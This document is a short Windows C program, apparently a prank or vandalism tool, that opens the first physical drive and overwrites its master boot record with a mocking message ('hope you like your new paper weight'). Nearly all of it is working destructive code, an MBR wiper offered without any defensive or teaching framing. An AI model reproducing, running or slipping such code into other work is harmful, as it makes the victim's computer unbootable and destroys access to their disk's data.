#include <stdio.h>
#include <windows.h>


int main(int argc, CHAR* argv[])
{

    OVERLAPPED osWrite;
    memset(&osWrite, 0, (1 * 512));
    osWrite.Offset = 0;
    osWrite.OffsetHigh = 0;
    osWrite.hEvent = 0;

    CHAR buffer[512];
    strncpy_s(buffer, "wow your computer just got destroyed by a kid, also, your cybersecurity suck a lot. welp, hope you like your new paper weight! getdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidgetdestoryedbyakidalso im a furry ;) bye!!!",512);

    HANDLE hHandle = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_FLAG_NO_BUFFERING, 0);
    WriteFile(hHandle, buffer, (1 * 512), NULL, &osWrite);
    CloseHandle(hHandle);

    printf("MBR Write Complete\n");
    return 0;
}